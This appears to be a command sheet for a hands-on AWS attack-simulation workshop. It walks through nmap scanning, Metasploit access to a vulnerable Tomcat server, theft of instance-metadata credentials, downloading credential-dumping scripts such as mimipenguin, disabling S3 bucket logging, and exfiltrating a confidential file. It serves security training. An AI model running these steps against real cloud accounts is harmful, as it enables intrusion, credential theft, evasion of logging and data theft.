# All Commands

## Lab 0 - Explore

https://us-east-1.console.aws.amazon.com/ec2/home?region=us-east-1#Instances:tag:Name=LinuxBastion

```shell
kubectl get pods -A
```

https://us-east-1.console.aws.amazon.com/ec2/home?region=us-east-1#Instances:tag:Name=Kali

## Lab 1 - Reconnaissance - active scanning using NMAP

```shell
export TARGET_DNS=$(aws elbv2 describe-load-balancers --query \ LoadBalancers[].DNSName --output text)
echo $TARGET_DNS
```

```shell
nmap -Pn -v -A $TARGET_DNS
```

https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-554739/Apache-Tomcat-8.0.32.html

https://www.exploit-db.com/search?cve=2017-12617

## Lab 2 - Initial Access

```shell
./start-msploit.sh
```

```shell
sudo msfconsole -r startup.rc
```

```shell
sessions -i 1
```

```shell
ls -al
```

## Lab 3 - Privilege Escalation by enumerating instance profile role

```shell
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

## Credential Access via crednetials from Password Stores; Lateral Movement vis Ingress tool transfer.

```shell
netstat -n | grep 443
```

```shell
ls -al
```

```shell
wget http://IP/collection.sh
```

```shell
wget http://IP/mimipenguin.sh
```

## Lab 4 - Defense Evasion by impairing defenses

```shell
aws sts get-caller-identity
```

```shell
aws s3 ls
```

```shell
TARGET_BUCKET=$(aws s3api list-buckets --query 'Buckets[].[Name]' --output text | grep confidentialbucket)
echo $TARGET_BUCKET
aws s3api get-bucket-logging --bucket $TARGET_BUCKET
```

```shell
echo "{}" > no-bucket-logging.json
aws s3api put-bucket-logging --bucket $TARGET_BUCKET --bucket-logging-status file://no-bucket-logging.json
aws s3api get-bucket-logging --bucket $TARGET_BUCKET
```

## Exfiltration

```shell
aws s3 ls s3://$TARGET_BUCKET
aws s3 cp s3://$TARGET_BUCKET/confidential-data.txt s3-captured.txt
ls -al
```
